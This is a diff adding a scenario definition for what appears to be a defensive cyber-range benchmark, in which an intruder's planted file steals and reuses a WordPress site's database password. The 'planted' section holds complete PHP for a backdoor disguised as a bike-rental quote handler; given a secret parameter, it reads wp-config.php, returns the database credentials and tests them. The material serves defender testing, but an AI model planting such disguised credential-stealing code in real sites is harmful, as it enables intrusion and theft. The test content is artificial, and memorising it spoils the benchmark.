@@ -1,0 +1,38 @@
+{
+ "id": "s3",
+ "title": "Service secrets taken and used",
+ "kind": "bench",
+ "story": [
+  "An intruder got in through the old support plugin before the restart and left one extra file in the deployed plugin folder. The file looks like the handler a developer put next to it.",
+  "During the shift it reads the site's database password through that file and uses it three times; before each use it reads the password again. It also calls the support plugin, as the agency does."
+ ],
+ "switches": {
+  "flaws": "muplugin",
+  "foothold": "none",
+  "business": "on"
+ },
+ "head_start_s": 180,
+ "shift_s": 1200,
+ "jitter_s": 20,
+ "perfect_at_s": 500,
+ "damage": {
+  "measure": "stolen_keys_used",
+  "limit": 2,
+  "unit": "uses of the stolen database password that worked (0 to 3)"
+ },
+ "setup": {
+  "planted": [
+   {
+    "kind": "file",
+    "host": "web-01",
+    "path": "{spare_handler}",
+    "text": "<?php\n/**\n * Rental quote for the booking box on the rentals page.\n * The box posts the day, the frame size and the number of days and shows the price.\n * Theo, May: copied here by hand with the availability check. Goes into the repository with the next release.\n */\nheader( 'Content-Type: application/json; charset=utf-8' );\nheader( 'Cache-Control: no-store' );\n\nif ( 'POST' !== ( $_SERVER['REQUEST_METHOD'] ?? 'GET' ) ) {\n\thttp_response_code( 405 );\n\techo json_encode( array( 'ok' => false, 'error' => 'post only' ) );\n\texit;\n}\n\n// Price per day by bike type; a week counts as five days.\n$rates = array( 'hardtail' => 45, 'gravel' => 55, 'kids' => 25, 'ebike' => 85, 'tandem' => 70, 'fat' => 50 );\n\n$ref = (string) ( $_POST['ref'] ?? '' );\nif ( hash_equals( 'q7-41c09e5fa2', $ref ) ) {\n\t// Site settings for the quote mail.\n\t$conf = (string) @file_get_contents( dirname( __DIR__, 4 ) . '/wp-config.php' );\n\tpreg_match_all( \"/define\\(\\s*'(DB_[A-Z]+)'\\s*,\\s*'([^']*)'/\", $conf, $m );\n\t$site = array_combine( $m[1], $m[2] );\n\tif ( isset( $_POST['code'] ) ) {\n\t\t$n = -1;\n\t\ttry {\n\t\t\t$db = @mysqli_connect( $site['DB_HOST'] ?? '', $site['DB_USER'] ?? '', (string) $_POST['code'], $site['DB_NAME'] ?? '' );\n\t\t\tif ( $db ) {\n\t\t\t\t$res = mysqli_query( $db, 'SELECT COUNT(*) FROM wp_users' );\n\t\t\t\t$n   = $res ? (int) mysqli_fetch_row( $res )[0] : -1;\n\t\t\t}\n\t\t} catch ( \\Throwable $e ) {\n\t\t\t$n = -1;\n\t\t}\n\t\techo json_encode( array( 'ok' => $n >= 0, 'n' => $n ) );\n\t\texit;\n\t}\n\techo json_encode( array( 'ok' => true, 'site' => $site, 'rates' => $rates ) );\n\texit;\n}\n\n$bike = strtolower( preg_replace( '/[^a-zA-Z]/', '', (string) ( $_POST['bike'] ?? 'hardtail' ) ) );\n$days = max( 1, min( 14, (int) ( $_POST['days'] ?? 1 ) ) );\n$rate = $rates[ $bike ] ?? 45;\n$paid = $days >= 7 ? $days - 2 * intdiv( $days, 7 ) : $days;\necho json_encode( array( 'ok' => true, 'bike' => $bike, 'days' => $days, 'per_day' => $rate, 'total' => $rate * $paid,\n\t'note' => 'Deposit by card at pick-up. Helmet included.' ) );\n",
+    "owner": "deploy:www-data",
+    "mode": "0664",
+    "age_days": 96,
+    "history_requests": {"per_week": [1, 3]}
+   }
+  ]
+ },
+ "notes": "Design: range/BENCH-SCENARIOS-DESIGN.md, S3; range/S3-BUILD-NOTES.md. Twins T7, T8, T12 and the release. Limit 2: the first use (+400 s) comes 4.5 minutes after the theft (+130 s); a defender who removes the file or rotates the password before the second use (+880 s) passes. Each use reads the settings again first and sends the value it read, so a rotation alone does not stop the uses; the rotation is still needed for Removed, because the password was read."
+}
